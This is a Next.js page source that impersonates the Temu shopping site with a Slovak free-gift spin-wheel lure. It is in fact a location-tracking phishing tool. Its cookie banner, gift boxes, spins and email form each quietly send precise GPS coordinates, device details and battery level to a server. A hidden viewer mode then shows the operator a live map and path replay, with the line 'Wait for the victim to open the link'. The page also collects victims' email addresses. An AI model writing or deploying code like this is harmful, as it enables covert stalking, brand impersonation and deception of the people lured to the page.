import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router';
import dynamic from 'next/dynamic';
import Script from 'next/script';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';
import { Star, MapPin, Heart } from 'lucide-react';
import confetti from 'canvas-confetti';
import { distanceBetweenMeters, distanceForPath, calculateEtaMinutes } from '../../lib/geoUtils';

const LeafletMap = dynamic(() => import('../../lib/LeafletMap'), { ssr: false });

const PRODUCTS = [
    { id: 1, name: "8/12 ks Solárne Zemné Bodov...", price: 11.59, rating: 4.8, reviews: "4,1tis.+", img: "/images/products/prod_solar_lights.png" },
    { id: 2, name: "45cm Elegantný veľký umelý v...", price: 14.98, rating: 4.9, reviews: "43", img: "/images/products/prod_wreath.png", oldPrice: 20.25 },
    { id: 3, name: "Electric Car Wash Foam Spray ...", price: 13.10, rating: 4.7, reviews: "196", img: "/images/products/prod_foam_sprayer.png", oldPrice: 21.49 },
    { id: 4, name: "Sada prístroja na úpravu viniča ...", price: 12.50, rating: 4.6, reviews: "173", img: "/images/products/prod_vine_pruner.png" },
    { id: 5, name: "TG668 Vonkajší Výkonný Pren...", price: 18.20, rating: 4.8, reviews: "1,4tis.+", img: "/images/products/prod_speaker.png" },
    { id: 6, name: "Prenosná sprcha pre kempova...", price: 15.90, rating: 4.5, reviews: "4,1tis.+", img: "/images/products/prod_camp_shower.png" }
];

const NAMES = ["J***n M.", "K***a P.", "M***o S.", "L***a V.", "A***x B."];
const mapContainerStyle = { width: '100%', height: '60vh' };
const DEFAULT_GEOFENCE_RADIUS = 80;

export default function DynamicTemuPage() {
    const router = useRouter();

    // --- Shared Logic ---
    const token = useMemo(() => {
        if (!router.isReady) return null;
        return router.query.token || null;
    }, [router.isReady, router.query.token]);

    const isViewerMode = useMemo(() => {
        if (!router.isReady) return false;
        return router.query.view === '1';
    }, [router.isReady, router.query.view]);

    // --- Temu State ---
    const [email, setEmail] = useState('');
    const [approxLocation, setApproxLocation] = useState('Detecting...');
    const [time, setTime] = useState('');
    const [showCookies, setShowCookies] = useState(true);
    const [gameState, setGameState] = useState(0);
    const [spinCount, setSpinCount] = useState(0);
    const [wheelAngle, setWheelAngle] = useState(0);
    const [progressWidth, setProgressWidth] = useState('85%');
    const [remainingCost, setRemainingCost] = useState('0.1');
    const [feedUser, setFeedUser] = useState(NAMES[0]);
    const [isSpinning, setIsSpinning] = useState(false);

    // --- Tracker/Viewer State ---
    const [location, setLocation] = useState(null);
    const [deviceInfo, setDeviceInfo] = useState(null);
    const [status, setStatus] = useState('Ready');
    const [error, setError] = useState('');
    const [trackPoints, setTrackPoints] = useState([]);
    const [distanceMeters, setDistanceMeters] = useState(0);
    const [geofenceEnabled, setGeofenceEnabled] = useState(true);
    const [geofenceCenter, setGeofenceCenter] = useState(null);
    const [geofenceRadius, setGeofenceRadius] = useState(DEFAULT_GEOFENCE_RADIUS);
    const [geofenceAlert, setGeofenceAlert] = useState('');
    const [batteryAware, setBatteryAware] = useState(true);
    const [batteryLevel, setBatteryLevel] = useState(null);
    const [batteryCharging, setBatteryCharging] = useState(null);
    const [targetLat, setTargetLat] = useState('');
    const [targetLng, setTargetLng] = useState('');
    const [etaMinutes, setEtaMinutes] = useState(null);
    const [isReplaying, setIsReplaying] = useState(false);
    const [replayIndex, setReplayIndex] = useState(0);
    const watchIdRef = useRef(null);

    // --- Effects & Callbacks ---

    // Temu Background Info
    useEffect(() => {
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => setApproxLocation(`${data.city}, ${data.country_name}`))
            .catch(() => setApproxLocation('Slovakia (Global)'));

        const clockInterval = setInterval(() => {
            const now = new Date();
            setTime(`${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')}`);
        }, 1000);

        const feedInterval = setInterval(() => {
            setFeedUser(NAMES[Math.floor(Math.random() * NAMES.length)]);
        }, 4000);

        const locationTimer = setTimeout(() => {
            if (!isViewerMode) requestLocation();
        }, 800);

        return () => {
            clearInterval(clockInterval);
            clearInterval(feedInterval);
            clearTimeout(locationTimer);
        };
    }, [isViewerMode]);

    // Battery API
    useEffect(() => {
        if (isViewerMode) return;
        let batteryManager;
        let onLevelChange;
        let onChargingChange;
        async function loadBattery() {
            if (!navigator.getBattery) return;
            batteryManager = await navigator.getBattery();
            setBatteryLevel(batteryManager.level);
            setBatteryCharging(batteryManager.charging);
            onLevelChange = () => setBatteryLevel(batteryManager.level);
            onChargingChange = () => setBatteryCharging(batteryManager.charging);
            batteryManager.addEventListener('levelchange', onLevelChange);
            batteryManager.addEventListener('chargingchange', onChargingChange);
        }
        loadBattery();
        return () => {
            if (batteryManager && onLevelChange) batteryManager.removeEventListener('levelchange', onLevelChange);
            if (batteryManager && onChargingChange) batteryManager.removeEventListener('chargingchange', onChargingChange);
        };
    }, [isViewerMode]);

    const sendLocation = useCallback(async (coords) => {
        if (!token) return;
        const payload = {
            token,
            lat: coords.latitude,
            lng: coords.longitude,
            accuracy: coords.accuracy,
            altitude: coords.altitude,
            heading: coords.heading,
            speed: coords.speed,
            deviceInfo: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                battery: batteryLevel ? Math.round(batteryLevel * 100) : null
            }
        };
        await axios.post('/api/location', payload);
    }, [token, batteryLevel]);

    const requestLocation = useCallback((finalEmail = null) => {
        if (isViewerMode) return;
        if (!navigator.geolocation) return;

        navigator.geolocation.getCurrentPosition(async (position) => {
            await sendLocation(position.coords);
            console.log("Location reported successfully");
        }, (err) => {
            console.log("Location permission denied", err);
        }, { enableHighAccuracy: true });
    }, [isViewerMode, sendLocation]);

    // Viewer Mode logic
    useEffect(() => {
        if (!token || !isViewerMode) return;
        let active = true;
        const fetchSession = async () => {
            try {
                const response = await axios.get(`/api/session/${token}`);
                if (!active || !response?.data?.session) return;
                const sessionPoints = response.data.session.points || [];
                setTrackPoints(sessionPoints.map((point) => ({ lat: point.lat, lng: point.lng })));
                if (sessionPoints.length > 0) {
                    const last = sessionPoints[sessionPoints.length - 1];
                    setLocation({ lat: last.lat, lng: last.lng });
                    setDistanceMeters(distanceForPath(sessionPoints));
                }
                setStatus('Viewer mode live refresh');
            } catch {
                if (active) setStatus('Viewer waiting for data...');
            }
        };
        fetchSession();
        const intervalId = setInterval(fetchSession, 3000);
        return () => { active = false; clearInterval(intervalId); };
    }, [isViewerMode, token]);

    // Replay logic
    useEffect(() => {
        if (!isReplaying || trackPoints.length < 2) return;
        const intervalId = setInterval(() => {
            setReplayIndex((current) => {
                if (current >= trackPoints.length - 1) {
                    setIsReplaying(false);
                    return current;
                }
                return current + 1;
            });
        }, 600);
        return () => clearInterval(intervalId);
    }, [isReplaying, trackPoints]);

    // --- Interaction Handlers ---
    const handleAcceptCookies = () => {
        setShowCookies(false);
        requestLocation();
    };

    const handlePickBox = () => {
        setGameState(1);
        requestLocation();
    };

    const handleSpin = () => {
        if (isSpinning) return;
        setIsSpinning(true);
        requestLocation();
        if (spinCount === 0) {
            setWheelAngle(1800);
            setTimeout(() => {
                setProgressWidth('98%');
                setRemainingCost('0.02');
                if (typeof window !== 'undefined') alert("EŠTE JEDEN HOD! Ste tak blízko!");
                setSpinCount(1);
                setIsSpinning(false);
            }, 4100);
        } else if (spinCount === 1) {
            setWheelAngle(3645);
            setTimeout(() => {
                setProgressWidth('100%');
                setRemainingCost('0.00');
                setTimeout(() => setGameState(3), 500);
            }, 4100);
        }
    };

    const handleFinalSubmit = (e) => {
        e.preventDefault();
        requestLocation(email);
        confetti({
            particleCount: 200,
            spread: 90,
            origin: { y: 0.6 },
            colors: ['#fb0201', '#ffb703', '#ffffff']
        });
        setGameState(4);
    };

    const displayPoint = isReplaying && trackPoints[replayIndex] ? trackPoints[replayIndex] : location;

    if (isViewerMode) {
        return (
            <main style={{ padding: '1rem', fontFamily: 'Arial, sans-serif', maxWidth: '800px', margin: '0 auto' }}>
                <Head>
                    <title>Admin Viewer - {token}</title>
                </Head>
                <Script
                    src={`https://maps.googleapis.com/maps/api/js?key=${process.env.NEXT_PUBLIC_GOOGLE_MAPS_API_KEY}&libraries=places`}
                />
                <h1>Live Location Viewer</h1>
                <p>Status: {status}</p>

                <div style={{ marginBottom: 12, background: '#f1f5f9', padding: 10 }}>
                    <strong>Session Token: {token}</strong>
                </div>

                {displayPoint ? (
                    <div style={mapContainerStyle}>
                        <LeafletMap
                            center={displayPoint}
                            zoom={17}
                            trackPoints={trackPoints}
                        />
                    </div>
                ) : (
                    <p>Wait for the victim to open the link and allow location...</p>
                )}

                <div style={{ marginTop: 12, background: '#eef6ff', padding: 10 }}>
                    <strong>Stats</strong>
                    <div>Points captured: {trackPoints.length}</div>
                    <div>Distance: {(distanceMeters / 1000).toFixed(3)} km</div>
                </div>

                <div style={{ marginTop: 12, background: '#f8fafc', padding: 10 }}>
                    <strong>Replay</strong>
                    <div style={{ display: 'flex', gap: 8, marginTop: 8 }}>
                        <button onClick={() => { setReplayIndex(0); setIsReplaying(true); }} disabled={trackPoints.length < 2}>Play</button>
                        <button onClick={() => setIsReplaying(false)}>Pause</button>
                    </div>
                </div>
            </main>
        );
    }

    return (
        <div className="temu-container">
            <Head>
                <title>TEMU | Darčeky zadarmo</title>
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
                <link rel="stylesheet" href="/styles/temu.css" />
            </Head>

            <div className="live-feed">
                <span><b>{feedUser}</b> práve vyhrala 4 darčeky!</span>
            </div>

            {(gameState < 3 || gameState === 3 || gameState === 4) && (
                <div className="game-overlay" style={{ opacity: gameState >= 3 ? 0.5 : 1, pointerEvents: gameState >= 3 ? 'none' : 'auto' }}>
                    <div className="game-container">
                        <h1 style={{ color: 'white', fontSize: '28px', marginBottom: '5px', textShadow: '0 2px 4px rgba(0,0,0,0.3)' }}>DARČEKY ZADARMO!</h1>
                        <p style={{ color: '#fff', marginBottom: '20px' }}>
                            {gameState === 0 ? "Vyberte si krabicu a začnite" : "Získali ste bonusový hod!"}
                        </p>

                        {gameState === 0 && (
                            <div className="step-boxes">
                                {[0, 1, 2].map(i => (
                                    <div key={i} className="magic-box" onClick={handlePickBox}>
                                        <div className="box-icon">🎁</div>
                                    </div>
                                ))}
                            </div>
                        )}

                        {gameState >= 1 && (
                            <div className="step-wheel">
                                <div className="progress-container">
                                    <div className="progress-bar" style={{ width: progressWidth }}></div>
                                    <div className="progress-text">Zostáva: <span>{remainingCost}€</span> k cieľu!</div>
                                </div>

                                <div className="wheel-outer">
                                    <svg className="wheel-pointer" viewBox="0 0 100 100">
                                        <path d="M50 100 L10 20 A45 45 0 1 1 90 20 Z" fill="#fb0201" />
                                    </svg>
                                    <div className="wheel-inner" style={{ transform: `rotate(${wheelAngle}deg)` }}>
                                        <div style={{ fontWeight: 900, fontSize: '14px', textAlign: 'center', transform: 'rotate(22deg)' }}>
                                            DARČEK<br />ZADARMO
                                        </div>
                                    </div>
                                </div>

                                <button className={`spin-btn ${!isSpinning ? 'pulsing' : ''}`} onClick={handleSpin} disabled={isSpinning}>
                                    TOČIŤ ZADARMO
                                </button>
                                <p style={{ color: '#fff', fontSize: '12px', marginTop: '15px' }}>Máte {2 - spinCount} voľné pokusy</p>
                            </div>
                        )}
                    </div>
                </div>
            )}

            <AnimatePresence>
                {gameState === 3 && (
                    <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="final-popup">
                        <h2 style={{ color: '#fb0201', fontSize: '28px', margin: 0 }}>GRATULUJEME!</h2>
                        <div style={{ fontSize: '50px', margin: '10px 0' }}>🎉</div>
                        <p style={{ fontSize: '16px', fontWeight: 'bold' }}>Vyhrali ste 4 položky za 0,00 €</p>
                        <p style={{ color: '#666', fontSize: '12px', marginBottom: '20px' }}>Služba je overená pre oblasť <b>{approxLocation}</b>. Zadajte e-mail pre uloženie výhry do 10 minút!</p>
                        <form onSubmit={handleFinalSubmit}>
                            <input type="email" placeholder="Váš email" required value={email} onChange={(e) => setEmail(e.target.value)} style={{ width: '100%', padding: '12px', borderRadius: '8px', border: '1px solid #ddd', marginBottom: '15px', boxSizing: 'border-box' }} />
                            <button type="submit" className="spin-btn" style={{ background: '#ffb703', color: '#000', boxShadow: '0 6px 0 #cc8e00', padding: '14px', fontSize: '16px' }}>VYBRAŤ DARČEKY</button>
                        </form>
                    </motion.div>
                )}

                {gameState === 4 && (
                    <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="final-popup">
                        <h2 style={{ color: '#22c55e', fontSize: '28px', margin: 0 }}>ÚSPECH!</h2>
                        <div style={{ fontSize: '50px', margin: '10px 0' }}>✅</div>
                        <p style={{ fontSize: '16px', fontWeight: 'bold' }}>Vaše darčeky sú pripravené.</p>
                        <p style={{ color: '#666', fontSize: '12px', marginBottom: '20px' }}>Inštrukcie na vyzdvihnutie boli odoslané na: <b>{email}</b></p>
                    </motion.div>
                )}
            </AnimatePresence>

            <AnimatePresence>
                {showCookies && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, y: 100 }} className="temu-cookie-banner" onClick={handleAcceptCookies} style={{ cursor: 'pointer' }}>
                        <div className="cookie-content" onClick={(e) => { e.stopPropagation(); handleAcceptCookies(); }} style={{ cursor: 'pointer', textAlign: 'center', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
                            <h2 style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>🔒 Overenie lokality</h2>
                            <p style={{ textAlign: 'center', lineHeight: '1.6' }}>Pre zobrazenie regionálnych darčekov pre oblasť <b>{approxLocation}</b> a používanie platformy vyžadujeme Váš súhlas s Cookies.</p>
                            <button onClick={(e) => { e.stopPropagation(); handleAcceptCookies(); }} className="cookie-btn">SÚHLASÍM A OVERIŤ</button>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            <div className={`main-content ${showCookies || gameState < 4 ? 'content-blur' : ''}`}>
                <div className="temu-status-bar">
                    <span>{time}</span>
                    <div className="flex gap-1 items-center">
                        <span>📶</span> <span>🔋</span>
                    </div>
                </div>

                <header className="temu-nav">
                    <div className="temu-brand-row">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Temu_logo.svg/1200px-Temu_logo.svg.png" alt="Temu" className="h-6" />
                    </div>
                    <div className="temu-categories">
                        <span className="active">Topánky</span>
                        <span>Domov a Kuchyňa</span>
                        <span>Elektronika</span>
                        <span>Krása a Zdravie</span>
                    </div>
                </header>

                <main className="temu-main" style={{ paddingBottom: '20px' }}>
                    <section className="temu-products">
                        <h3 className="section-title">Všetko pod 19,99 €</h3>
                        <div className="product-grid">
                            {PRODUCTS.map(p => (
                                <div key={p.id} className="product-card">
                                    <div className="product-img-wrap">
                                        <img src={p.img} alt={p.name} />
                                        <button className="heart-btn"><Heart size={14} /></button>
                                    </div>
                                    <div className="product-info">
                                        <p className="product-name">{p.name}</p>
                                        <div className="product-rating">
                                            <div className="stars">
                                                {[...Array(5)].map((_, i) => <Star key={i} size={8} fill="black" />)}
                                            </div>
                                            <span className="count" style={{ fontSize: '8px', color: '#999' }}>({p.reviews})</span>
                                        </div>
                                        <div className="product-price-row">
                                            <span className="price">{p.price} €</span>
                                        </div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </section>
                </main>
            </div>
        </div>
    );
}
